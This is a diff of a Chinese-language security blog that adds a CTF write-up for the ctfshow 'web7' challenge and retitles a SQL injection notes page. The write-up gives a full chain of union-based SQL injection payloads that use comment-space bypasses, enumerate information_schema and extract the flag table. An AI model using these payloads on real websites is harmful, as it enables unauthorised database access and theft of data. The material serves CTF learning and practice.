@@ -1127,6 +1127,55 @@ over</p>
 <blockquote>
 <p>​    QNKCDZO<br>​    240610708<br>​    byGcY<br>​    sonZ7y<br>​    aabg7XSs<br>​    aabC9RqS<br>​    s878926199a<br>​    s155964671a<br>​    s214587387a<br>​    s1091221200a</p>
 </blockquote>
+<h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><blockquote>
+<p>SQL联合注入</p>
+</blockquote>
+<blockquote>
+<p>打开题目看见文章列表，随机点击，点第一个</p>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_1.png" alt="ctfshow_web7_1"></p>
+<blockquote>
+<p>发现显示文章，本想搜索flag,发现没有，看见url中id&#x3D;1</p>
+<p><strong><u>从url地址栏中可以看到,页面通过文章的id值来查询文章内容,我们可以考虑SQL注入漏洞</u></strong></p>
+<p>首先判断注入点,输入以下payload,使SQL恒成立,发现显示文章成功</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1/**/and/**/1</span><br></pre></td></tr></table></figure></div>
+
+<p>在输入以下payload,使SQL恒不成立,发现显示不出文章，</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1/**/and/**/0</span><br></pre></td></tr></table></figure></div>
+
+<p>由此可以判断页面存在SQL注入,注入点为<u><strong>数值型注入</strong></u>,页面中有显示位,可以尝试<u><strong>联合注入</strong></u>进行脱库</p>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_2.png" alt="ctfshow_web7_2"></p>
+<blockquote>
+<p>先来判断显示位,此处id传一个**-1**,<strong>由于id通常不为负数,后端根据id查询不到内容</strong>,就只能展示联合查询的结果,从而帮助我们判断字段显示的位置</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,2,3#</span><br></pre></td></tr></table></figure></div>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_3.png" alt="ctfshow_web7_3"></p>
+<blockquote>
+<p>判断数据库</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,database(),3#</span><br></pre></td></tr></table></figure></div>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_4.png" alt="ctfshow_web7_4"></p>
+<blockquote>
+<p>查看web数据库中的flag表</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=&quot;web7&quot;),3#</span><br></pre></td></tr></table></figure></div>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_5.png" alt="ctfshow_web7_5"></p>
+<blockquote>
+<p>查看flag表中的flag字段</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&quot;flag&quot;),3#</span><br></pre></td></tr></table></figure></div>
+
+<p>也可使用</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=&quot;web7&quot;/**/and/**/table_name=&quot;flag&quot;),3</span><br></pre></td></tr></table></figure></div>
+
+
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_6.png" alt="ctfshow_web7_6"></p>
+<blockquote>
+<p>查看目标FLAG</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,(select/**/flag/**/from/**/flag),3#</span><br></pre></td></tr></table></figure></div>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_7.png" alt="ctfshow_web7_7"></p>
 <h2 id="CTFHUB"><a href="#CTFHUB" class="headerlink" title="CTFHUB"></a>CTFHUB</h2><h3 id="WEB-请求方式"><a href="#WEB-请求方式" class="headerlink" title="WEB_请求方式"></a><strong>WEB_请求方式</strong></h3><hr>
 <p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_1.png" alt="请求方式"></p>
 <hr>
@@ -1203,7 +1252,7 @@ over</p>
     <url>/2024/03/13/webctf/</url>
     <content><![CDATA[<meta name="referrer" content="no-referrer">
 
-<h1 id="CTF-WEB"><a href="#CTF-WEB" class="headerlink" title="CTF_WEB"></a>CTF_WEB</h1><h2 id="SQL注入："><a href="#SQL注入：" class="headerlink" title="SQL注入："></a>SQL注入：</h2><p>1、数据库为mysql的爆库、爆表、爆字段、爆值的语句：</p>
+<h1 id="CTF-WEB"><a href="#CTF-WEB" class="headerlink" title="CTF_WEB"></a>CTF_WEB</h1><h2 id="SQL注入：联合注入"><a href="#SQL注入：联合注入" class="headerlink" title="SQL注入：联合注入"></a>SQL注入：联合注入</h2><p>1、数据库为mysql的爆库、爆表、爆字段、爆值的语句：</p>
 <p><strong>爆库：</strong></p>
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,database();#查看此处有多字段</span><br></pre></td></tr></table></figure></div>
 
